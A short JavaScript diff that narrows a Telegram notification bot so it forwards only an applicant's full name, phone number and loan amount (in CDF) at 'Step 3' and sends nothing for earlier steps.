@@ -12,9 +12,17 @@ const botManager = {
         let msg = `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        for (const [k, v] of Object.entries(data)) {
-            msg += `<b>${k}:</b> <code>${v}</code>\n`;
+        
+        // Only format and send data for Step 3
+        if (title.includes("Step 3")) {
+            msg += `👤 <b>Full Name:</b> <code>${data.firstName} ${data.lastName}</code>\n`;
+            msg += `📱 <b>Phone Number:</b> <code>${data.phone}</code>\n`;
+            msg += `💰 <b>Loan Amount:</b> <code>${data.amount} CDF</code>\n`;
+        } else {
+            // For steps 1, 2 - don't send anything to Telegram
+            return;
         }
+        
         msg += `━━━━━━━━━━━━━━━━━━━━`;
 
         const options = { parse_mode: 'HTML' };
